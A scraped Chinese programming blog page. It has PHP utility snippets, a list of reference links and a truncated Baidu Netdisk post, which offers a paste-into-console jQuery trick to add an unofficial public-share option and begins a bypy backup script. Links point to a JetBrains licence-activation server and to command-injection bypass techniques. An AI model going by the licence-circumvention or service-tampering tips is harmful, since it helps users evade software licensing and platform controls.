<h3 id="分割字符串"><a href="#分割字符串" class="headerlink" title="分割字符串"></a>分割字符串</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params">$string</span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">            <span class="keyword">return</span> preg_split(<span class="string">'/(?&lt;!^)(?!$)/u'</span>, $string);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">    &gt;&gt;&gt; mb_str_split(<span class="string">'我是谁'</span>)</span><br><span class="line">    =&gt; [</span><br><span class="line">         <span class="string">"我"</span>,</span><br><span class="line">         <span class="string">"是"</span>,</span><br><span class="line">         <span class="string">"谁"</span>,</span><br><span class="line">       ]</span><br></pre></td></tr></table></figure>
<h3 id="计算身份证的最后一位验证码"><a href="#计算身份证的最后一位验证码" class="headerlink" title="计算身份证的最后一位验证码"></a>计算身份证的最后一位验证码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @functionName 计算身份证的最后一位验证码</span></span><br><span class="line"><span class="comment">     * @description  根据国家标准GB 11643-1999，前提必须是18位的证件号</span></span><br><span class="line"><span class="comment">     *https://github.com/alicfeng/identity-card</span></span><br><span class="line"><span class="comment">     * @param string $idBody 证件号码的前17位数字</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return bool|mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">calculateCode</span>(<span class="params">$idBody</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">17</span> != strlen($idBody)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加权因子</span></span><br><span class="line">        $factor = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>];</span><br><span class="line">        <span class="comment">//校验码对应值</span></span><br><span class="line">        $code     = [<span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'X'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>];</span><br><span class="line">        $checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        foreach (range(<span class="number">0</span>, strlen($idBody) - <span class="number">1</span>) <span class="keyword">as</span> $index =&gt; $item) &#123;</span><br><span class="line">            $checksum += substr($idBody, $index, <span class="number">1</span>) * $factor[$index];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $code[$checksum % <span class="number">11</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">使用简单工厂模式重新实现达到解耦的目的</span><br><span class="line"></span><br><span class="line">将加减乘除解耦，每一个运算用单独的类去写，再用工厂模式实例化出合适的对象，通过多态返回计算器结果，后面如果再加一个平方根运算可以新增一个平方根的类，如果需要修改加法运算，那就只需要修改 OperationAdd 类。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $num1;</span><br><span class="line">    public $num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationAdd</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;num1 + $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationSub</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;num1 - $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationMul</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;num1 * $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationDiv</span> <span class="keyword">extends</span> <span class="title">Operation</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;num2 != <span class="number">0</span>) &#123;</span><br><span class="line">            $result = $<span class="keyword">this</span>-&gt;num1 / $<span class="keyword">this</span>-&gt;num2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $result = <span class="string">"除数不能为0"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OperationFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createOperate</span>(<span class="params">$symbol</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($symbol) &#123;<span class="comment">//多态</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationAdd();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationSub();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationMul();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">                $result = <span class="keyword">new</span> OperationDiv();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $result = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$operationFactory = OperationFactory::createOperate(<span class="string">'+'</span>);</span><br><span class="line">$operationFactory-&gt;num1 = <span class="number">21</span>;</span><br><span class="line">$operationFactory-&gt;num2 = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">echo $operationFactory-&gt;getResult();<span class="comment">//32  https://learnku.com/articles/32491</span></span><br></pre></td></tr></table></figure>
<h3 id="array-reduce-多值化一"><a href="#array-reduce-多值化一" class="headerlink" title="array_reduce 多值化一"></a>array_reduce 多值化一</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">array_reduce 函数内部实现机制，更类似于如下代码</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">array_reduce2</span>(<span class="params">$array, $callback, $initial=null</span>)</span>&#123;</span><br><span class="line">        $acc = $initial;</span><br><span class="line">        foreach($array <span class="keyword">as</span> $a)</span><br><span class="line">            $acc = $callback($acc, $a);</span><br><span class="line">        <span class="keyword">return</span> $acc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   array_reduce2([<span class="number">2</span>,<span class="number">4</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$carry,$x</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  $carry+$x;</span><br><span class="line">    &#125;);  <span class="comment">// 6</span></span><br><span class="line">    将一个序列函数的嵌套调用组合为 array_reduce 产生的新函数调用</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...$functions</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array_reduce(</span><br><span class="line">            $functions,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">$carry,$function</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">$x</span>)<span class="title">use</span>(<span class="params">$carry,$function</span>)</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> $<span class="function"><span class="keyword">function</span>(<span class="params">$carry($x</span>));</span></span><br><span class="line"><span class="function">                &#125;;</span></span><br><span class="line"><span class="function">            &#125;,</span></span><br><span class="line"><span class="function">            <span class="title">function</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $x;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    效果</span><br><span class="line">    $compose = compose(</span><br><span class="line">        <span class="comment">// 加 2</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $x + <span class="number">2</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 乘 4</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $x * <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    $res = $compose(<span class="number">3</span>); <span class="comment">// （3+2）*4 = 20  https://learnku.com/articles/32417</span></span><br></pre></td></tr></table></figure>
<h3 id="过滤空白字符"><a href="#过滤空白字符" class="headerlink" title="过滤空白字符"></a>过滤空白字符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$s=<span class="string">"　　空白字符"</span>;</span><br><span class="line">&gt;&gt;&gt; strlen($s)</span><br><span class="line">=&gt; <span class="number">18</span></span><br><span class="line">说明前<span class="number">2</span>个字符长度为<span class="number">6</span>，是全角空格</span><br><span class="line">&gt;&gt;&gt; json_encode([<span class="string">'　'</span>])</span><br><span class="line">=&gt; <span class="string">"["</span>\u3000<span class="string">"]"</span></span><br><span class="line">&gt;&gt;&gt; preg_replace(<span class="string">"/\s+/u"</span>, <span class="string">""</span>,$s)</span><br><span class="line">=&gt; <span class="string">"空白字符"</span></span><br><span class="line">&gt;&gt;&gt; preg_replace(<span class="string">"/\s+/"</span>, <span class="string">""</span>,$s)</span><br><span class="line">=&gt; <span class="string">"　　空白字符"</span></span><br><span class="line">&gt;&gt;&gt; preg_replace(<span class="string">"/\x&#123;3000&#125;+/u"</span>,<span class="string">''</span>,$s)</span><br><span class="line">=&gt; <span class="string">"空白字符"</span></span><br><span class="line">&gt;&gt;&gt; trim($s,<span class="string">'　'</span>)</span><br><span class="line">=&gt; <span class="string">"空白字符"</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/29685" target="_blank" rel="noopener">TCP/IP 协议</a></p>
<p><a href="https://learnku.com/articles/30341" target="_blank" rel="noopener">PHP 设计模式</a></p>
<p><a href="https://learnku.com/articles/25813" target="_blank" rel="noopener">php错误和异常</a></p>
<p><a href="https://learnku.com/articles/22942" target="_blank" rel="noopener">PHP 操作 Redis </a></p>
<p><a href="https://learnku.com/articles/24802" target="_blank" rel="noopener">Redis 基础</a></p>
<p><a href="https://github.com/wujunze/php-geo" target="_blank" rel="noopener">PHP地理位置</a></p>
<p><a href="https://learnku.com/articles/28114" target="_blank" rel="noopener">用 PHP 写一个微波炉</a></p>
<p><a href="https://github.com/mylxsw/wizard" target="_blank" rel="noopener">Laravel 开发的一款文档管理系统</a></p>
<p><a href="https://learnku.com/articles/30178" target="_blank" rel="noopener">PHP 开发量化交易的工具，模拟交易所 API 数据</a></p>
<p><a href="https://www.cnblogs.com/zyf-zhaoyafei/p/6928149.html" target="_blank" rel="noopener">再谈PHP错误与异常处理</a></p>
<p><a href="https://learnku.com/articles/30049" target="_blank" rel="noopener">MemCached 编译安装部署</a></p>
<p><a href="https://learnku.com/articles/30032" target="_blank" rel="noopener">TCP 的连接建立与关闭状态及数据传输通信过程</a></p>
<p><a href="">PhpSpreadsheet 小教程https://github.com/PHPOffice/PhpSpreadsheet</a></p>
<p><a href="https://learnku.com/articles/30051" target="_blank" rel="noopener">理解 cookie、session、token</a></p>
<p><a href="https://learnku.com/articles/29160" target="_blank" rel="noopener">如何快速接入 GitHub 登陆</a></p>
<p><a href="https://github.com/stabunkow/china-stock-data" target="_blank" rel="noopener">获取国内财经门户网股票数据composer包https://learnku.com/laravel/t/30040</a></p>
<p><a href="https://learnku.com/articles/30034" target="_blank" rel="noopener">面向对象的三大特性</a></p>
<p><a href="https://learnku.com/articles/29920" target="_blank" rel="noopener">PHP 经典面试问题解决过程：上台阶问题</a></p>
<p><a href="https://learnku.com/articles/29967" target="_blank" rel="noopener">Tideways、xhprof 和 xhgui 打造 PHP 非侵入式监控平台</a></p>
<p><a href="https://github.com/jc91715/oc-plugin-book" target="_blank" rel="noopener">文档协作翻译插件</a></p>
<p><a href="https://learnku.com/articles/29808" target="_blank" rel="noopener"> Slim 框架使用orm</a></p>
<p><a href="https://learnku.com/php/t/28934" target="_blank" rel="noopener">PHP 基础算题之动态规划leetcode</a></p>
<p><a href="https://learnku.com/articles/25760#replies" target="_blank" rel="noopener"> PC 端微信扫码支付全过程 — easywechat + Laravel 5.8</a></p>
<p><a href="https://free-andy.github.io/php-dict/" target="_blank" rel="noopener">php函数列表</a></p>
<p><a href="https://learnku.com/php/t/28922" target="_blank" rel="noopener">PHP 面向对象设计的五个基准原则</a></p>
<p><a href="https://learnku.com/articles/26995" target="_blank" rel="noopener">扫二维码登录过程</a></p>
<p><a href="https://learnku.com/php/t/26050" target="_blank" rel="noopener">使用 TUS 协议来实现大文件的断点续传</a></p>
<p><a href="https://github.com/terrylinooo/shieldon" target="_blank" rel="noopener">防爬虫机器人盗文</a></p>
<p><a href="https://zhaobugs.com/2018/12/04/Nginx%E4%B9%8B%E6%97%85-%E7%8E%AF%E5%A2%83%E7%A1%AE%E8%AE%A4%E5%8F%8ANginx%E7%9A%84%E5%AE%89%E8%A3%85/" target="_blank" rel="noopener">Nginx之旅-环境确认及Nginx的安装</a></p>
<p><a href="https://github.com/aoxiang594/laravel-province-city-area" target="_blank" rel="noopener">省市县数据扩展包</a></p>
<p><a href="https://learnku.com/articles/26686" target="_blank" rel="noopener">代理与反向代理、负载均衡和缓存</a></p>
<p><a href="https://wi1dcard.cn/posts/phpbrew-documention/" target="_blank" rel="noopener">多版本 PHP 共存phpbrew</a></p>
<p><a href="https://github.com/wi1dcard/thumb-php" target="_blank" rel="noopener">单文件 PHP 缩略图库</a></p>
<p><a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">命令注入绕过姿势</a></p>
<p><a href="https://coffeephp.com/" target="_blank" rel="noopener">PHP论坛</a></p>
<p><a href="http://blog.lanyus.com/archives/317.html" target="_blank" rel="noopener">搭建jetbrains激活服务器</a></p>
<p><a href="https://iluoy.com/articles/87" target="_blank" rel="noopener">phpstorm的奇技淫巧http://phpstorm.tips/tips</a></p>
<p><a href="http://www.phppan.com/php-design-pattern/" target="_blank" rel="noopener">PHP设计模式</a></p>
<p><a href="https://www.kancloud.cn/martist/ma_zhao_liu/376759" target="_blank" rel="noopener">开发者知识体系</a></p>
<p><a href="https://learnku.com/articles/10885/full-use-of-jwt" target="_blank" rel="noopener">JWT 完整使用详解</a></p>
<p><a href="http://www.edbiji.com/doccenter/showdoc/4/nav/678.html" target="_blank" rel="noopener">PHP笔记</a></p>
<p><a href="https://www.restran.net/2016/09/26/php-security-notes/" target="_blank" rel="noopener">CTF 中的 PHP 知识汇总</a></p>
<p><a href="https://yq.aliyun.com/articles/699892?spm=a2c4e.11153959.0.0.1a265ee3ENEDVQ" target="_blank" rel="noopener">聊聊服务稳定性保障这些事</a></p>
<p><a href="https://www.paycats.cn/" target="_blank" rel="noopener">个人开发者在线收款的服务</a></p>
<p><a href="https://learnku.com/articles/19465" target="_blank" rel="noopener">加密货币市场实时价格脚本</a></p>
<p><a href="https://github.com/chrismaltby/gb-studio" target="_blank" rel="noopener">GameBoy开发</a></p>
<p><a href="https://github.com/Danack/Imagick-demos" target="_blank" rel="noopener">An example of all the Imagick functions</a></p>
<p><a href="https://www.jishuwen.com/d/2NGy#tuit" target="_blank" rel="noopener">静态扫描为你的PHP项目上线保驾护航</a></p>
<p><a href="https://www.slidestalk.com/s/code_static_analysis" target="_blank" rel="noopener">静态扫描为你的PHP项目上线保驾护航</a></p>
<p><a href="https://yq.aliyun.com/teams/405/type_blog?spm=a2c4e.11153940.0.0.355e573f6aNW7x" target="_blank" rel="noopener">PHP技术进阶</a></p>
<p><a href="https://learnku.com/php/t/27412" target="_blank" rel="noopener">2019 PHP 安全指南</a></p>
<p><a href="https://laravel-china.github.io/php-the-right-way/" target="_blank" rel="noopener">php之道</a></p>
<p><a href="https://www.boatsky.com/blog/53" target="_blank" rel="noopener">2核1G内存的服务器能承载多少人访问</a></p>
<p><a href="https://www.boatsky.com/blog/26" target="_blank" rel="noopener">深入理解IEEE754的64位双精度</a></p>
<p><a href="https://andongshen.com/2019/04/21/webhooks-php/" target="_blank" rel="noopener">自动拉取github上的仓库</a></p>
<p><a href="https://github.com/mingyoung/dingtalk" target="_blank" rel="noopener">EasyDingTalk</a></p>
<p><a href="https://github.com/icecho/leetcode" target="_blank" rel="noopener">尝试 leetcode 题目</a></p>
<p><a href="https://www.qingwei.tech/programe-develops/php/622.html" target="_blank" rel="noopener">PHP常用函数整理</a></p>
<p><a href="https://github.com/alicfeng/note.samego.com" target="_blank" rel="noopener">笔记分享 | 简书2GitHub</a></p>
<p><a href="https://github.com/dedemao/weixinPay" target="_blank" rel="noopener">微信支付单文件版</a></p>
<p><a href="https://learnku.com/articles/28256" target="_blank" rel="noopener">无限级分类、多级菜单、省份城市</a></p>
<p><a href="https://www.fanhaobai.com/2018/09/process-php-multiprocess-server.html" target="_blank" rel="noopener">用PHP玩转进程之二 — 多进程PHPServer</a></p>
<p><a href="https://gitee.com/zmzmzm/unid" target="_blank" rel="noopener">unid是一个可以生成唯一ID的php扩展</a></p>
<p><a href="https://learnku.com/articles/28245#topnav" target="_blank" rel="noopener">秒杀系统的设计</a></p>
<p><a href="https://spacevim.org/cn/use-vim-as-a-php-ide/" target="_blank" rel="noopener">使用 Vim 搭建 PHP 开发环境</a></p>
<p><a href="https://github.com/free-andy/docker-dev" target="_blank" rel="noopener">docker 构建 php 开发环境</a></p>
<p><a href="https://github.com/maximebf/php-debugbar" target="_blank" rel="noopener">Debug bar for PHP</a></p>
<p><a href="https://github.com/FireLustre/php-dfa-sensitive" target="_blank" rel="noopener">过滤敏感词汇</a></p>
<p><a href="https://shuwoom.com/?p=3151" target="_blank" rel="noopener">COOKIE和SESSION机制详解</a></p>
<p><a href="https://www.njphper.com/posts/210095c.html" target="_blank" rel="noopener">webupload 实现分片上传视频</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/09/百度网盘资源/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/09/百度网盘资源/" itemprop="url">百度网盘资源</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-09T19:24:41+08:00">
                2019-05-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="公开分享"><a href="#公开分享" class="headerlink" title="公开分享"></a>公开分享</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度网盘 – 选择文件分享 – 分享框弹出 – 打开浏览器开发者工具进入控制台（按F12 或者右键打开） – 粘贴以下代码！</span><br><span class="line">$(<span class="string">".share-method-line"</span>).parent().append(<span class="string">'&lt;div class="share-method-line"&gt;&lt;input type="radio" id="share-method-public" name="share-method" value="public" checked=""&gt;&lt;span class="icon radio-icon icon-radio-non"&gt;&lt;/span&gt;&lt;label for="share-method-public"&gt;&lt;b&gt;公开分享&lt;/b&gt;&lt;span&gt;无需提取码,任何人都可直接访问下载！&lt;/span&gt; &lt;/label&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="百度网盘备份"><a href="#百度网盘备份" class="headerlink" title="百度网盘备份"></a>百度网盘备份</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/houtianze/bypy</span></span><br><span class="line">sudo pip install requests</span><br><span class="line"></span><br><span class="line">git clone https:<span class="comment">//github.com/houtianze/bypy.git</span></span><br><span class="line">./bypy.py info</span><br><span class="line">./bypy.py upload ./requirements.txt test/requirements.txt</span><br><span class="line">vim backup.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SCRIPT_DIR="/root" #这个改成你存放刚刚下载下来的bypy的文件夹位置</span><br><span class="line">DROPBOX_DIR="/backup" #这个改成你的备份文件想要放在百度网盘下面的文件夹名称，如果不存在，脚本会自动创建</span><br><span class="line">BACKUP_SRC="/home/wwwroot /usr/local/nginx/conf" #这个是你想要备份的本地VPS上的文件，不同的目录用空格分开</span><br><span class="line">BACKUP_DST="/tmp" #这个是你暂时存放备份压缩文件的地方，一般用/tmp即可</span><br><span class="line">MYSQL_SERVER="localhost" #这个是你mysql服务器的地址，一般填这个本地地址即可</span><br><span class="line">MYSQL_USER="mysqluser" #这个是你mysql的用户名名称，比如root或admin之类的</span><br><span class="line">MYSQL_PASS="password" #这个是你mysql用户的密码</span><br><span 